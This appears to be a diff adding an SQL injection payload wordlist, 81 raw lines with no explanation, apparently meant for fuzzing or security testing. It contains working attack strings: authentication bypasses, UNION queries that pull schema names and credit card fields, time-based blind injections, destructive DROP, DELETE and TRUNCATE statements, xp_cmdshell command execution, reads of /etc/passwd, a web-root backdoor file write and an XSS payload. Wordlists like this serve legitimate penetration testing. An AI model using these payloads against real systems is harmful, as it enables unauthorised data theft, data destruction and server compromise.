@@ -1,0 +1,81 @@
+' OR 1=1; --
+' OR '1'='1'; --
+") OR 1=1; -- 
+') OR 1=1; --
+' OR 'x'='x'; --
+1' UNION SELECT 1; --
+1' UNION SELECT 1,2; --
+/*...*/OR 1=1; --  
+%00' OR 1=1;--
+" OR 1=1; --
+OR 1=1-- 
+' OR '1 
+') OR ('1'='1
+') UNION SELECT '%25%253fWelcomeToSQLInjectionWorld%252C+
+1;SELECT%20*
+1'; DROP TABLE users
+1'; DELETE FROM users
+1'; TRUNCATE TABLE users
+1' AND SLEEP(5); #
+1' OR SLEEP(5); #
+1';WAITFOR DELAY '00:00:10'--
+1';WAITFOR DELAY '0:0:10'--
+1';SELECT PG_SLEEP(10)--
+1';SELECT SLEEP(10); -- (for MySQL)
+1' OR IF(TRUE,SLEEP(5),FALSE); #
+1' AND 1=0 UNION ALL SELECT 1,2,3;--
+1' AND 1=0 UNION ALL SELECT 1,@@version,3;--
+1' OR 1=1 UNION ALL SELECT 1,2,3;-- 
+1' OR 1=1 UNION ALL SELECT 1,@@version,3;--
+1' OR 1=1 UNION ALL SELECT 1,table_name,3 FROM information_schema.tables;--
+1' OR 1=1 UNION ALL SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users';--
+1' OR 1=1 UNION ALL SELECT CreditCardID,CardNumber,ExpMonth FROM Credit_Card ;-- 
+-1' OR 1 UNION SELECT table_schema,table_name FROM information_schema.tables;--
+-1' OR 1 UNION SELECT column_name,column_type FROM information_schema.columns WHERE table_name='users';--
+1' OR extractvalue(1,concat(0x3a,(SELECT table_name FROM information_schema.tables LIMIT 1)));--  
+1' OR updatexml(null,concat(0x3a,(SELECT table_name FROM information_schema.tables LIMIT 1)),1);--
+1' OR PG_SLEEP(10)--
+1';WAITFOR DELAY '0:0:10'--
+WAITFOR DELAY '0:0:05'
+'; BEGIN IF (1=1) WAITFOR DELAY '0:0:10'; END IF; END;
+'; IF (1=1) WAITFOR DELAY '0:0:10'; END IF;'
+1';EXEC master..xp_cmdshell 'ping 127.0.0.1'--
+1';EXEC xp_cmdshell 'ping 127.0.0.1'--
+1'; SELECT * FROM master..sysprocesses
+1';DROP members
+1';ALTER members DROP COLUMN Passwords
+1';COPY members(username, password) FROM '/tmp/members.txt'--  
+1';SELECT load_file('/etc/passwd')
+load_file(0x633A2F6574632F706173737764)
+1';SELECT 0x50,0x416,0x494c4755,0x204d INTO OUTFILE '/tmp/root.txt'
+SELECT 0x3C62723E,0x74726C613E INTO DUMPFILE '/var/www/backdoor.php'
+1' UNION ALL SELECT NULL,@@version,NULL;--
+1' UNION ALL SELECT NULL,'<script>alert("XSS")</script>',NULL;--
+1' UNION ALL SELECT NULL,load_file('/etc/passwd'),NULL;--
+" OR ""="
+' OR ''=' 
+x' OR 1=1 OR 'x'='y
+/
+//*
+/*!12345UNION SELECT*//*
+'+UNION+SELECT+
+'%2bunion%2bselect%2b
+" OR ""--"
+' OR ''--'
+" OR ""#
+' OR ''#  
+"=0 or ""="
+'=0 or ''='
+") or (1=1) or ("
+') or ('1'='1') or ('
+")) or ((1=1)) or (("
+')) or (('1'='1')) or (('
+"x"="x" 
+'x'='x'
+") or ("x"="x") or ("
+') or ('x'='x') or ('
+%22%78%22%3D%22%78 
+0x7878633d7878
+)); DROP TABLE users; --
+1 AND 1=0 UNION SELECT 1,2,schema_name FROM INFORMATION_SCHEMA.SCHEMATA;--
+1 AND 1=0 UNION SELECT 1,2,table_name FROM INFORMATION_SCHEMA.TABLES WHERE table_schema != 'mysql' AND table_schema != 'information_schema';--
